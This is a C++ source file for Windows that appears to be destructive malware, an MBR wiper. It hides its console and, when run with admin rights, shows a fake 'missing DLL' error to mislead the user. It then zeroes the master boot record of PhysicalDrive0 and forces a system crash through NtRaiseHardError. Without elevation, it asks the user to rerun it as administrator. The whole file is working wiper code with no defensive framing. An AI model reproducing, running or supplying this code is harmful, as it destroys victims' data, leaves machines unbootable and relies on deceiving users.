#include <Windows.h>
#include <iostream>
#pragma comment(lib, "ntdll.lib")
using namespace std;

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
    PULONG_PTR Parameters, ULONG ValidResponseOption, PULONG Response);
char mbr_data[512];

void hide()
{
    HWND Stealth;
    AllocConsole();
    Stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Stealth, 0);
}

int CALLBACK WinMain(HINSTANCE Inst, HINSTANCE Prev, LPSTR Cmd, int showcmd)
{
    BOOL admin = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
            admin = Elevation.TokenIsElevated;
        }
    }
    if (hToken) {
        CloseHandle(hToken);
    }
    if (admin == TRUE)
    {
        MessageBox(0, "System Error", "This app can\'t start because api-ms-win-crt-runtime-l1-1-0.dll is\nmissing from your computer. Try reinstalling the program to fix this problem", MB_ICONERROR | MB_OK);
        ZeroMemory(&mbr_data, (sizeof mbr_data));
        DWORD dwBytesWritten;
        HANDLE hDevice = CreateFileW(
            L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
            FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
            OPEN_EXISTING, 0, 0);

        WriteFile(hDevice, mbr_data, 512, &dwBytesWritten, 0);
        CloseHandle(hDevice);
        BOOLEAN bl;
        unsigned long response;
        RtlAdjustPrivilege(19, true, false, &bl);
        NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
        return 0;
    }
    else
    {
        return MessageBox(0, "Error: Access denied", "Please restart the file with administrator privileges", MB_ICONERROR | MB_OK);
    }
}
